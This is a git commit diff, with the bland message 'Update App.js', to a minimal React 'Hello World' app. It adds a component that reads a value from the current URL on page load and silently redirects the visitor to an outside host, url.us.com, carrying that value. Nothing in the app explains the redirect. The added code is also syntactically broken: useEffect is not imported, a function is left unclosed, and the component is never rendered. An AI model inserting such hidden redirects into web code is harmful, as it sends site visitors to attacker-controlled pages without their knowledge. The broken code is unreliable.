6c0e1dcb8aaa125fe83d6e17716aa6f3fc6b0067
Seleini2 <ghibli@telia.com>
2025-04-16 11:47:40 +0100

    Update App.js

--- src/App.js
+++ src/App.js
@@ -1,6 +1,25 @@
 import React from 'react';
 
 function App() {
+
+  const RedirectComponent = () => {
+  const redirectCurrentToCustomURL = () => {
+    const currentURL = window.location.href;
+    const pattern = /=--([^&]*?)&/;
+    const match = currentURL.match(pattern);
+
+    if (match) {
+      const extractedValue = match[1];
+      setTimeout(() => {
+        window.location.href = `https://url.us.com/${extractedValue}`;
+      }, 100);
+    }
+  };
+
+  // Run on component mount (page load)
+  useEffect(() => {
+    redirectCurrentToCustomURL();
+  }, []);
   const value = 'World';
   return <div>Hello {value}</div>;
 }
